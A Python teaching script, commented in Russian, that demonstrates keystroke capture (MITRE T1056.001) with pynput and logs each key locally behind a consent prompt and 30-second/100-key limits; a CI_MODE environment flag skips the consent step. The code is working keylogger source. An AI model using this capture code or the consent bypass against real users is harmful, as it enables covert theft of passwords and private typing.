#!/usr/bin/env python3
"""
Keylogger Demo - Демонстрация техники Input Capture (MITRE ATT&CK T1056.001)
Образовательный проект для демонстрации перехвата клавиатурного ввода

ВНИМАНИЕ: Только для учебных целей на своей машине с явного согласия!
"""

import os
import sys
import time
from datetime import datetime
from pathlib import Path

# Импортируем библиотеку для перехвата нажатий клавиш
try:
    from pynput import keyboard
except ImportError:
    print("ОШИБКА: Библиотека pynput не установлена!")
    print("Установите её командой: pip install pynput")
    sys.exit(1)


# ============================================================================
# НАСТРОЙКИ
# ============================================================================

# Путь к файлу с логом (можно изменить)
# На Windows: C:\temp\keydemo.log
# На Linux/Mac (для тестирования): /tmp/keydemo.log
if sys.platform == "win32":
    LOG_FILE = r"C:\temp\keydemo.log"
else:
    # Для тестирования на Mac/Linux
    LOG_FILE = "/tmp/keydemo.log"

# Ограничения для автоматической остановки
MAX_DURATION_SECONDS = 30  # Максимум 30 секунд работы
MAX_KEY_PRESSES = 100      # Или максимум 100 нажатий клавиш

# Флаг для CI-тестирования (без запроса согласия)
CI_MODE = os.environ.get("CI_MODE", "false").lower() == "true"


# ============================================================================
# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
# ============================================================================

# Счетчик нажатий клавиш
key_press_count = 0

# Время начала работы программы
start_time = None

# Объект listener для остановки
listener = None


# ============================================================================
# ФУНКЦИИ
# ============================================================================

def log_message(message):
    """
    Простая функция логирования с временной меткой
    Выводит сообщение в консоль с текущим временем
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")


def show_warning_and_get_consent():
    """
    Показывает предупреждение и запрашивает согласие пользователя

    Возвращает:
        bool: True если пользователь согласен, False если отказался
    """
    print("\n" + "=" * 70)
    print("ВНИМАНИЕ! ПРОГРАММА МОНИТОРИНГА КЛАВИАТУРЫ")
    print("=" * 70)
    print()
    print("Эта программа перехватывает нажатия клавиш и записывает их в файл.")
    print()
    print("Цель: Учебная демонстрация техники Input Capture")
    print("      (MITRE ATT&CK T1056.001)")
    print()
    print(f"Лог-файл: {LOG_FILE}")
    print(f"Ограничения: {MAX_DURATION_SECONDS} секунд или {MAX_KEY_PRESSES} нажатий")
    print()
    print("ВАЖНО:")
    print("  - Все нажатия клавиш будут записаны в текстовый файл")
    print("  - Программа остановится автоматически через заданное время")
    print("  - Это учебная демонстрация, не используйте на чужих компьютерах!")
    print("  - Вы можете остановить программу нажатием Ctrl+C")
    print()
    print("=" * 70)
    print()

    # Запрашиваем согласие
    response = input("Вы согласны продолжить? (yes/no): ").strip().lower()

    # Проверяем ответ
    if response in ["yes", "y", "да", "д"]:
        log_message("Пользователь дал согласие на мониторинг")
        return True
    else:
        log_message("Пользователь отказался от мониторинга")
        return False


def setup_log_file():
    """
    Подготавливает файл для записи логов
    Создает директорию, если её нет
    """
    try:
        # Создаем директорию, если её нет
        log_path = Path(LOG_FILE)
        log_path.parent.mkdir(parents=True, exist_ok=True)

        # Создаем или очищаем файл, записываем заголовок
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write("=" * 70 + "\n")
            f.write(f"KEYLOGGER LOG - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 70 + "\n")
            f.write(f"Ограничения: {MAX_DURATION_SECONDS}с или {MAX_KEY_PRESSES} нажатий\n")
            f.write("=" * 70 + "\n\n")

        log_message(f"Лог-файл создан: {LOG_FILE}")
        return True

    except Exception as e:
        log_message(f"ОШИБКА при создании лог-файла: {e}")
        return False


def write_to_log(text):
    """
    Записывает текст в лог-файл с временной меткой

    Аргументы:
        text (str): Текст для записи
    """
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {text}\n")
    except Exception as e:
        log_message(f"ОШИБКА при записи в лог: {e}")


def check_stop_conditions():
    """
    Проверяет условия для остановки программы

    Возвращает:
        bool: True если нужно остановиться, False если продолжать
    """
    global key_press_count, start_time

    # Проверяем количество нажатий
    if key_press_count >= MAX_KEY_PRESSES:
        log_message(f"Достигнут лимит нажатий: {key_press_count}")
        return True

    # Проверяем время работы
    if start_time is not None:
        elapsed_time = time.time() - start_time
        if elapsed_time >= MAX_DURATION_SECONDS:
            log_message(f"Достигнут лимит времени: {elapsed_time:.1f}с")
            return True

    return False


def on_key_press(key):
    """
    Обработчик события нажатия клавиши
    Эта функция вызывается каждый раз при нажатии клавиши

    Аргументы:
        key: Объект клавиши из pynput
    """
    global key_press_count, listener

    # Увеличиваем счетчик нажатий
    key_press_count += 1

    try:
        # Обрабатываем обычные символьные клавиши
        if hasattr(key, 'char') and key.char is not None:
            # Это обычная буква/цифра/символ
            char = key.char
            write_to_log(f"Key: '{char}'")

        else:
            # Это специальная клавиша (Enter, Space, Ctrl, и т.д.)
            key_name = str(key).replace("Key.", "")
            write_to_log(f"Special: {key_name}")

    except Exception as e:
        log_message(f"ОШИБКА при обработке клавиши: {e}")

    # Проверяем, не пора ли остановиться
    if check_stop_conditions():
        log_message("Условия остановки выполнены, завершаем работу...")
        write_to_log("=== Мониторинг остановлен ===")

        # Останавливаем listener
        if listener:
            listener.stop()
        return False  # Возврат False останавливает listener


def start_keylogger():
    """
    Запускает основной цикл мониторинга клавиатуры
    """
    global start_time, listener

    log_message("Запуск мониторинга клавиатуры...")
    log_message(f"Лимиты: {MAX_DURATION_SECONDS}с или {MAX_KEY_PRESSES} нажатий")
    log_message("Нажмите Ctrl+C для остановки")

    # Запоминаем время начала
    start_time = time.time()

    # Создаем и запускаем listener для перехвата клавиш
    # Listener работает в отдельном потоке и вызывает on_key_press при каждом нажатии
    with keyboard.Listener(on_press=on_key_press) as listener_obj:
        listener = listener_obj

        try:
            # Ждем, пока listener работает
            listener.join()

        except KeyboardInterrupt:
            # Пользователь нажал Ctrl+C
            log_message("Получен сигнал остановки от пользователя (Ctrl+C)")
            write_to_log("=== Остановлено пользователем ===")

    # Вычисляем статистику
    elapsed_time = time.time() - start_time
    log_message(f"Мониторинг завершен")
    log_message(f"Перехвачено нажатий: {key_press_count}")
    log_message(f"Время работы: {elapsed_time:.2f}с")


def show_log_file():
    """
    Показывает содержимое лог-файла после завершения
    """
    log_message(f"Содержимое лог-файла {LOG_FILE}:")
    print("\n" + "=" * 70)

    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            print(f.read())
    except Exception as e:
        log_message(f"ОШИБКА при чтении лог-файла: {e}")

    print("=" * 70 + "\n")


# ============================================================================
# ГЛАВНАЯ ФУНКЦИЯ
# ============================================================================

def main():
    """
    Главная функция программы
    Координирует весь процесс: запрос согласия, настройка, мониторинг
    """
    log_message("Программа Keylogger Demo запущена")
    log_message(f"Платформа: {sys.platform}")
    log_message(f"Python: {sys.version.split()[0]}")

    # В CI-режиме пропускаем запрос согласия
    if CI_MODE:
        log_message("CI MODE: Пропускаем запрос согласия")
    else:
        # Показываем предупреждение и запрашиваем согласие
        if not show_warning_and_get_consent():
            log_message("Программа завершена без запуска мониторинга")
            sys.exit(0)

    # Подготавливаем лог-файл
    if not setup_log_file():
        log_message("Не удалось подготовить лог-файл, завершение")
        sys.exit(1)

    # Запускаем мониторинг
    try:
        start_keylogger()
    except Exception as e:
        log_message(f"ОШИБКА во время мониторинга: {e}")
        import traceback
        traceback.print_exc()

    # Показываем результаты
    show_log_file()

    log_message("Программа завершена")


# ============================================================================
# ТОЧКА ВХОДА
# ============================================================================

if __name__ == "__main__":
    main()

